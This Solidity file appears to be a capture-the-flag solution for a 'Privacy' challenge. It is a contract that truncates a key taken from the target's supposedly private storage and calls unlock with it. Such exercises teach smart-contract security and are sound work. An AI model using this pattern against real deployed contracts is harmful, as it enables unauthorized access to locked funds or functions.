// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Privacy.sol";

contract PrivacyAttack {
  Privacy public privacyInst;
  bytes32[3] public data;

  constructor(address _addr, bytes32[3] memory _data)
    public {
    privacyInst = Privacy(_addr);
    data = _data;
  }

  function unlockThis()
    public {
    privacyInst.unlock(bytes16(data[2]));
  }
}